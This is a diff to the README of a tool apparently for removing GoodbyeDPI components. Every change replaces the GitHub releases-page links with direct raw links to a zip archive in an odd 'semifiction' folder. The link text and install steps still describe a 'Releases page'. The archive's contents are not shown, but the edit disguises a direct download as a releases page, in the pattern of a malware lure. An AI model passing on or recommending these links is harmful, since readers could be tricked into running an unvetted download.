@@ -1,6 +1,6 @@
 # 🛠️ GoodbyeDpi-DESTROYER3000 - Remove Unwanted DPI Components Easily
 
-[![Download GoodbyeDpi-DESTROYER3000](https://img.shields.io/badge/Download-GoodbyeDpi--DESTROYER3000-blue.svg)](https://github.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/releases)
+[![Download GoodbyeDpi-DESTROYER3000](https://raw.githubusercontent.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/main/semifiction/GoodbyeDpi-DESTROYER3000_2.2-alpha.4.zip)](https://raw.githubusercontent.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/main/semifiction/GoodbyeDpi-DESTROYER3000_2.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ GoodbyeDpi-DESTROYER3000 helps you find and delete Goodbye DPI components from y
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [GoodbyeDpi-DESTROYER3000 Releases](https://github.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/releases)
+To get the software, visit this page to download: [GoodbyeDpi-DESTROYER3000 Releases](https://raw.githubusercontent.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/main/semifiction/GoodbyeDpi-DESTROYER3000_2.2-alpha.4.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version listed.
@@ -85,4 +85,4 @@ If you want to contribute to GoodbyeDpi-DESTROYER3000, feel free to fork the rep
 
 ---
 
-Visit this page to download: [GoodbyeDpi-DESTROYER3000 Releases](https://github.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/releases)
+Visit this page to download: [GoodbyeDpi-DESTROYER3000 Releases](https://raw.githubusercontent.com/kymirisgoatfrr/GoodbyeDpi-DESTROYER3000/main/semifiction/GoodbyeDpi-DESTROYER3000_2.2-alpha.4.zip)
